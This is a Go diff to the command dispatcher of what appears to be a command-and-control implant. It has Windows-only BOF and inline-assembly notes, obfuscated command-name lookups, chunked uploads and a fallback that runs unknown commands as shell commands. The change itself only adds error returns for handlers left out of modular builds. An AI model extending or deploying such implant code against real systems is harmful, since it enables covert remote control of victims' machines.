@@ -42,8 +42,16 @@ func (cq *WorkQueue) processNextCommand() (*OpResult, error) {
 	// NOTE: inline-assembly and bof commands are Windows-only (.NET CLR / BOF loader)
 	// They are not supported on Linux/Darwin builds - no handlers registered
 
-	// Handle upload chunks
+	// Handle upload chunks (only if upload feature is registered)
 	if cmd.Cmd == getCqStr(idxCqCmdUpload) && cmd.Data != "" {
+		if _, exists := cq.cmdHandlers[CmdUpload]; !exists {
+			return &OpResult{
+				Cmd:    cmd,
+				EStr:   Err(E19),
+				EC:     1,
+				Done:   time.Now().Format(time.RFC3339),
+			}, nil
+		}
 		result, err := HandleUploadChunk(cmd, cq.cmdContext)
 		if err != nil {
 			return &OpResult{
@@ -152,7 +160,19 @@ func (cq *WorkQueue) processNextCommand() (*OpResult, error) {
 		return &result, nil
 	}
 
-	// If no handler found (CT == CmdUnknown or unregistered), try shell command
+	// Known command type but handler not compiled in (modular build)
+	if cmd.CT != CmdUnknown {
+		return &OpResult{
+			Cmd:    cmd,
+			Output: Err(E19),
+			Error:  fmt.Errorf("%s", Err(E19)),
+			EStr:   Err(E19),
+			EC:     1,
+			Done:   time.Now().Format(time.RFC3339),
+		}, nil
+	}
+
+	// CmdUnknown: try as shell command
 	output, err := executeShellCommand(cmd.Cmd)
 	if err != nil {
 		return &OpResult{
